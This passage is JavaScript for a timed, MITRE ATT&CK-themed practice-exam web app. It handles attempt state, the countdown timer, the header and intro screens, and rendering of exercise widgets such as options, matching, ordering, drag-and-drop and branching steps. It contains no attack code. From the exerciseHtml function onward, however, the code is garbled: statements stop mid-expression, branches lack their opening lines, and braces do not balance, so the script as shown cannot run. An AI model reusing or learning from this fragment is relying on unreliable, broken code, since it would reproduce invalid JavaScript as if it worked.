    for (i = 0; i < s.length; i++) { h = (h * 31 + s.charCodeAt(i)) >>> 0; }
    return h;
  }
  function exSeed(ex, salt) { return ((S.seed ^ 0x9E3779B9) * 2654435761 + hashId(ex.id) * 97 + salt) >>> 0; }

  /* ============================ data ============================ */
  var DATA = JSON.parse($('exam-data').textContent);
  var EXS = DATA.exercises;
  var TOTAL = EXS.length;
  var BUDGET = (DATA.estimatedMinutes || 25) * 60;
  var PASSMARK = DATA.passMark || 70;
  var SEVCLS = { 'EASY': 'sev-easy', 'MEDIUM': 'sev-medium', 'HARD': 'sev-hard', 'EXTREMELY HARD': 'sev-extreme' };
  var byId = {};
  EXS.forEach(function (e) { byId[e.id] = e; });

  /* ============================ state ============================ */
  var S = {
    screen: 'intro',        // intro | exam | review | results
    attempt: 0,
    order: [],
    pos: 0,
    answers: {},            // exId -> widget state
    results: {},            // exId -> graded result
    skipped: [],            // exIds in the skip pool (never answered yet)
    hintUsed: {},
    creditSum: 0,
    answeredCount: 0,
    state: 'RUNNING',       // RUNNING | PAUSED_MANUAL | PAUSED_AUTO_CHECK | ENDED
    resumeState: null,
    remaining: BUDGET,
    pauseAccum: { manual: 0, autoCheck: 0 },
    posted: false,
    mode: 'main',           // main | review
    reviewList: [],
    seed: 1,
    checkedId: null,
    exTimer: null,          // { exId, remaining } for per-exercise timed terminal exercises
    handshake: null
  };

  /* ============================ timer ============================ */
  var lastTick = Date.now();
  setInterval(function () {
    var now = Date.now();
    var dt = (now - lastTick) / 1000;
    lastTick = now;
    if (dt < 0 || dt > 2) { dt = 0.25; }
    if (S.state === 'RUNNING') {
      S.remaining -= dt;
      if (S.remaining <= 0) { S.remaining = 0; updateHeader(); endByTimeout(); return; }
      if (S.exTimer && !S.results[S.exTimer.exId] && S.screen === 'exam') {
        S.exTimer.remaining -= dt;
        var et = $('ex-timer-clock');
        if (et) { et.textContent = fmtClock(S.exTimer.remaining); }
        if (S.exTimer.remaining <= 0) { S.exTimer.remaining = 0; doCheck(true); }
      }
      updateTimerClock();
    } else if (S.state === 'PAUSED_MANUAL') {
      S.pauseAccum.manual += dt;
    } else if (S.state === 'PAUSED_AUTO_CHECK') {
      S.pauseAccum.autoCheck += dt;
    }
  }, 250);

  function updateTimerClock() {
    var el = $('hdr-clock');
    if (el) { el.textContent = fmtClock(S.remaining); }
  }
  function setState(next) {
    S.state = next;
    renderTimerPill();
    renderPauseOverlay();
  }
  function renderTimerPill() {
    var pill = $('hdr-timer');
    if (!pill) { return; }
    var clock = '<span class="t-clock" id="hdr-clock">' + fmtClock(S.remaining) + '</span>';
    if (S.state === 'RUNNING') {
      pill.className = 'pill pill-timer st-run';
      pill.innerHTML = '<span class="t-state">▶ Running</span>' + clock;
    } else if (S.state === 'PAUSED_MANUAL') {
      pill.className = 'pill pill-timer st-pause';
      pill.innerHTML = '<span class="t-state">⏸ PAUSED — manual (press Resume)</span>' + clock;
    } else if (S.state === 'PAUSED_AUTO_CHECK') {
      pill.className = 'pill pill-timer st-pause';
      pill.innerHTML = '<span class="t-state">⏸ PAUSED — reviewing feedback (resumes on Next)</span>' + clock;
    } else {
      pill.className = 'pill pill-timer st-end';
      pill.innerHTML = '<span class="t-state">■ Ended</span>' + clock;
    }
  }

  /* ============================ header ============================ */
  function headerHtml() {
    var sev = DATA.severity;
    var cls = SEVCLS[sev] || 'sev-easy';
    return '<header class="hdr" id="hdr">' +
      '<div class="hdr-row">' +
        '<span class="counter" id="hdr-counter"></span>' +
        '<span class="sev ' + cls + '" id="hdr-sev"><span class="dot" aria-hidden="true"></span>' + esc(sev) + '</span>' +
        '<span class="hdr-spacer"></span>' +
        '<span class="pill pill-timer" id="hdr-timer" role="timer"></span>' +
        '<span class="pill" id="hdr-score" aria-label="Live score"></span>' +
      '</div>' +
      '<div class="hdr-row">' +
        '<button type="button" class="btn" id="btn-hint">? Hint</button>' +
        '<button type="button" class="btn" id="btn-skip">Skip »</button>' +
        '<button type="button" class="btn" id="btn-pause">⏸ Pause</button>' +
        '<div class="progress" role="progressbar" id="hdr-progress" aria-label="Exam progress" aria-valuemin="0" aria-valuemax="' + TOTAL + '" aria-valuenow="0">' +
          '<div class="progress-fill" id="progress-fill"></div>' +
        '</div>' +
      '</div>' +
    '</header>';
  }
  function updateHeader() {
    var ex = currentEx();
    var counter = $('hdr-counter');
    if (counter) {
      if (S.screen === 'results') {
        counter.textContent = 'Exam complete';
      } else {
        var n = S.pos + 1;
        counter.textContent = (S.mode === 'review' ? 'Review · ' : '') + 'Exercise ' + n + ' of ' + TOTAL;
      }
    }
    var score = $('hdr-score');
    if (score) {
      var pct = fmtPct(S.creditSum, S.answeredCount);
      score.innerHTML = 'Score <b>' + fmt1(S.creditSum) + '</b>&nbsp;/&nbsp;' + S.answeredCount + ' · ' + pct + '%';
    }
    var hint = $('btn-hint'), skip = $('btn-skip'), pause = $('btn-pause');
    var answered = ex && !!S.results[ex.id];
    if (hint) {
      hint.disabled = answered || !!S.hintUsed[ex ? ex.id : ''] || S.state !== 'RUNNING' && S.state !== 'PAUSED_AUTO_CHECK';
      hint.setAttribute('aria-label', 'Hint (costs 10% of this exercise credit, one use only)');
    }
    if (skip) {
      skip.disabled = answered || S.state !== 'RUNNING';
      skip.setAttribute('aria-label', 'Skip this exercise and move it to the skipped pool');
    }
    if (pause) {
      var manual = S.state === 'PAUSED_MANUAL';
      pause.innerHTML = manual ? '▶ Resume' : '⏸ Pause';
      pause.disabled = S.state === 'ENDED';
      pause.setAttribute('aria-label', manual ? 'Resume the exam' : 'Pause the exam manually (hides the exercise)');
    }
    var fill = $('progress-fill');
    if (fill) {
      var done = S.answeredCount + S.skipped.length;
      var pctW = TOTAL > 0 ? Math.round((done / TOTAL) * 100) : 0;
      fill.style.width = pctW + '%';
      var pb = $('hdr-progress');
      if (pb) { pb.setAttribute('aria-valuenow', String(done)); }
    }
  }

  /* ============================ intro screen ============================ */
  function renderIntro() {
    S.screen = 'intro';
    var intro = DATA.intro;
    var kw = (intro.keywords || []).map(function (grp) {
      return '<div class="kw-theme"><h3>' + esc(grp.theme) + '</h3><ul>' +
        grp.items.map(function (k) { return '<li>' + esc(k) + '</li>'; }).join('') + '</ul></div>';
    }).join('');
    var html =
      '<div class="intro">' +
        '<section class="intro-strip" aria-label="Exam facts">' +
          '<h1>' + esc(DATA.mitreId) + ' — ' + esc(DATA.mitreName) + '</h1>' +
          '<div class="intro-sub">' + esc(DATA.objectType) + ' · MITRE ATT&CK · ' + esc(DATA.severity) + ' practice exam</div>' +
          '<div class="factrow">' +
            '<span class="fact"><b>' + TOTAL + '</b> exercises</span>' +
            '<span class="sev ' + (SEVCLS[DATA.severity] || 'sev-easy') + '"><span class="dot" aria-hidden="true"></span>' + esc(DATA.severity) + '</span>' +
            '<span class="fact">Estimated time: <b>' + DATA.estimatedMinutes + ' min</b></span>' +
            '<span class="fact">Timer budget: <b>' + fmtClock(BUDGET) + '</b></span>' +
            '<span class="fact">Pass mark: <b>' + PASSMARK + '%</b></span>' +
          '</div>' +
        '</section>' +
        '<section class="intro-card"><h2>What you will learn here</h2>' +
          intro.learn.map(function (p) { return '<p>' + esc(p) + '</p>'; }).join('') +
        '</section>' +
        '<section class="intro-card"><h2>Keywords covered in this exam</h2>' +
          '<div class="kw-grid">' + kw + '</div>' +
        '</section>' +
        '<section class="intro-card"><h2>How this exam works</h2>' +
          '<ul class="how-list">' + intro.how.map(function (p) { return '<li>' + esc(p) + '</li>'; }).join('') + '</ul>' +
          '<div class="intro-start">' +
            '<button type="button" class="btn btn-primary btn-big" id="btn-start">Start exam</button>' +
            '<span class="start-note">The timer starts when you press Start.</span>' +
          '</div>' +
        '</section>' +
      '</div>';
    var app = $('app');
    app.innerHTML = html;
    $('btn-start').addEventListener('click', startAttempt);
  }

  /* ============================ attempt control ============================ */
  function startAttempt() {
    S.attempt += 1;
    S.seed = 1 + S.attempt * 7919;
    S.order = EXS.map(function (_, i) { return i; });
    if (S.attempt > 1) {
      S.order = shuffled(S.order, mulberry32(S.seed));
    }
    S.pos = 0;
    S.answers = {};
    S.results = {};
    S.skipped = [];
    S.hintUsed = {};
    S.creditSum = 0;
    S.answeredCount = 0;
    S.pauseAccum = { manual: 0, autoCheck: 0 };
    S.posted = false;
    S.mode = 'main';
    S.reviewList = [];
    S.checkedId = null;
    S.exTimer = null;
    S.remaining = BUDGET;
    S.screen = 'exam';
    setState('RUNNING');
    renderExam();
  }
  function currentEx() {
    if (S.screen !== 'exam' && S.screen !== 'results') { return null; }
    if (S.pos < 0 || S.pos >= S.order.length) { return null; }
    return EXS[S.order[S.pos]];
  }

  /* ============================ exercise rendering ============================ */
  function scenarioLong(sc) {
    var chars = (sc.text || []).join(' ').length;
    return chars > 600 || (sc.artefacts && sc.artefacts.length >= 2);
  }
  function artefactHtml(a, idx) {
    var body;
    if (a.kind === 'log' || a.kind === 'code') {
      var lines = (a.lines || []).map(function (ln) {
        return '<span class="ln">' + highlight(ln) + '</span>';
      }).join('');
      var filter = a.filter ? '<input type="text" class="logfilter" data-filter="' + idx + '" placeholder="Filter lines (text match)" aria-label="Filter log lines">' : '';
      body = filter + '<pre class="mono loglines" data-logbody="' + idx + '">' + lines + '</pre>';
    } else {
      body = '<pre class="mono loglines">' + (a.lines || []).map(function (ln) { return esc(ln); }).join('\n') + '</pre>';
    }
    return '<div class="artefact"><div class="artefact-label"><span aria-hidden="true">▤</span>' + esc(a.label) + '</div>' + body + '</div>';
  }
  var SYN_RE = /(&quot;[^&]*?&quot;)|(\bT\d{4}(?:\.\d{3})?\b)|(--?[A-Za-z][\w-]*)|(\b[\w.\-]+(?:[\/\\][\w.\-@]+)+[\/\\]?)|(\b\d{1,3}(?:\[\.\]\d{1,3}){2,3}\b)|(\b(?:allowed|denied|accepted|rejected|granted|denied|quarantine|failed|success|error|warning|blocked|trusted|unblocked|Root|UNTRUSTED|SIGNATURE|PASS|FAIL)\b)/gi;
  function highlight(line) {
    var e = esc(line);
    return e.replace(SYN_RE, function (m, q, mid, flag, path, ip, kw) {
      if (q) { return '<span class="tok-s">' + q + '</span>'; }
      if (mid) { return '<span class="tok-m">' + mid + '</span>'; }
      if (flag) { return '<span class="tok-f">' + flag + '</span>'; }
      if (path) { return '<span class="tok-c">' + path + '</span>'; }
      if (ip) { return '<span class="tok-n">' + ip + '</span>'; }
      if (kw) { return '<span class="tok-k">' + kw + '</span>'; }
      return m;
    });
  }
  function optText(ex, oid) {
    var o = (ex.options || []).find(function (x) { return x.id === oid; });
    return o ? o.text : oid;
  }
  function optsHtml(ex, kind) {
    var rnd = mulberry32(exSeed(ex, 1));
    var ids = ex.options.map(function (o) { return o.id; });
    var view = shuffled(ids, rnd);
    var role = kind === 'single' ? 'radio' : 'checkbox';
    var a = S.answers[ex.id] || {};
    var sel = a.sel || [];
    return '<div class="opts" role="group" aria-label="Answer options">' + view.map(function (oid, i) {
      /* options are shuffled per attempt; correct positions vary */
      var isSel = sel.indexOf(oid) >= 0;
      return '<button type="button" class="opt" data-oid="' + esc(oid) + '" role="' + role + '" aria-checked="' + (kind === 'single' && isSel) + '" aria-pressed="' + (kind === 'multi' && isSel) + '">' +
        '<span class="opt-key">' + String.fromCharCode(65 + i) + '.</span>' +
        '<span class="opt-text">' + esc(optText(ex, oid)) + '</span>' +
        '<span class="opt-mark">' + (isSel ? '● Selected' : '') + '</span>' +
      '</button>';
    }).join('') + '</div>' +
    (kind === 'multi' ? '<p class="note">Select all options that apply. Partial credit is possible.</p>' : '');
  }
  function exerciseHtml(ex) {
    var sc = ex.scenario || {};
    var long = scenarioLong(sc);
    var paras = (sc.text || []).map(function (p) { return '<p>' + esc(p) + '</p>'; }).join('');
    var arts = (sc.artefacts || []).map(function (a, i) { return artefactHtml(a, i); }).join('');
    var body = '<div class="scen-body" id="scen-body">' + paras + arts + '</div>';
    var html = '';
    if (S.mode === 'review') {
      html += '<div class="review-banner">⚠ Skipped earlier — you are answering it now from the review screen. The timer is running.</div>';
    }
    html += '<section class="block" aria-label="Scenario">' +
      '<div class="block-h h-scenario"><span class="bico" aria-hidden="true">▤</span> SCENARIO<span class="hspacer"></span>' +

  }
  function widgetHtml(ex) {

      inner = optsHtml(ex, 'multi');

      var rnd = mulberry32(exSeed(ex, 2));
      var rights = shuffled(ex.pairs.map(function (p) { return p.right; }), rnd);
      inner = '<div class="matchrows">' + ex.pairs.map(function (p, i) {
        var cur = a.match ? a.match[i] : '';
        return '<div class="matchrow"><span class="match-left">' + esc(p.left) + '</span>' +
          '<select class="match-sel" data-left="' + i + '" aria-label="Match for: ' + esc(p.left) + '">' +
          '<option value="">— choose —</option>' +
          rights.map(function (r) { return '<option value="' + esc(r) + '"' + (cur === r ? ' selected' : '') + '>' + esc(r) + '</option>'; }).join('') +

      }).join('') + '</div>';

      inner = '<ol class="orderlist">' + a.arr.map(function (si, pos) {

          '<span class="order-text">' + esc(ex.steps[si]) + '</span>' +

            '<button type="button" data-move="down" data-pos="' + pos + '" aria-label="Move down: ' + esc(ex.steps[si]) + '">▼</button>' +

            '<option value="">— choose —</option>' +
            b.choices.map(function (c) { return '<option value="' + esc(c) + '"' + (val === c ? ' selected' : '') + '>' + esc(c) + '</option>'; }).join('') +
            '</select>' + esc(b.after || '');
        }
        return esc(b.before) + '<input type="text" class="blank-in" data-b="' + i + '" value="' + esc(val) + '" aria-label="' + esc(b.hint || 'Blank') + '" autocomplete="off" spellcheck="false" size="' + Math.max(10, Math.min(40, (b.answer[0] || '').length + 4)) + '">' + esc(b.after || '');
      }).join('') + '</p>';
    } else if (ex.type === 'drag') {
      if (!a.placed) { a.placed = {}; }
      if (!a.bankOrder) { a.bankOrder = shuffled(ex.items.map(function (it) { return it.id; }), mulberry32(exSeed(ex, 4))); }
      var placedIds = Object.keys(a.placed);
      var bankItems = ex.items.filter(function (it) { return placedIds.indexOf(it.id) < 0; });
      var inBank = a.bankOrder.filter(function (iid) { return bankItems.some(function (it) { return it.id === iid; }); });
      inner = '<div class="dnd">' +
        '<div class="bank" id="bank" aria-label="Item bank"><span class="bank-title">Items</span>' +

          }).join('') +
        '</div>' +
        '<div class="zones">' + ex.zones.map(function (z) {
          var inside = ex.items.filter(function (it) { return a.placed[it.id] === z.id; });
          return '<div class="zone" data-zid="' + esc(z.id) + '" tabindex="0" role="button" aria-label="Drop zone: ' + esc(z.label) + '. Select an item, then press Enter to place it.">' +
            '<div class="zone-h">' + esc(z.label) + '</div>' +
            '<div class="zone-items">' + inside.map(function (it) {
              return '<button type="button" class="bankitem" draggable="true" data-iid="' + esc(it.id) + '" data-inzone="' + esc(z.id) + '">' + esc(it.text) + '<span class="place-note">Click to send back to the bank</span></button>';

        '<div class="shell-in"><span class="prompt">' + esc(promptTxt) + '</span>' +

    } else if (ex.type === 'branch') {

      if (st < br.steps.length) {

        inner = '<span class="branch-step">STEP ' + (st + 1) + ' OF ' + stepsTotal + '</span>' +
          '<p class="q-text" style="font-size:15.5px;font-weight:600">' + esc(step.prompt) + '</p>' +
          '<div class="opts" style="margin-top:10px">' + step.options.map(function (o, i) {
            var isSel = a.bsel === o.id;
            return '<button type="button" class="opt" data-boid="' + esc(o.id) + '" role="radio" aria-checked="' + isSel + '">' +
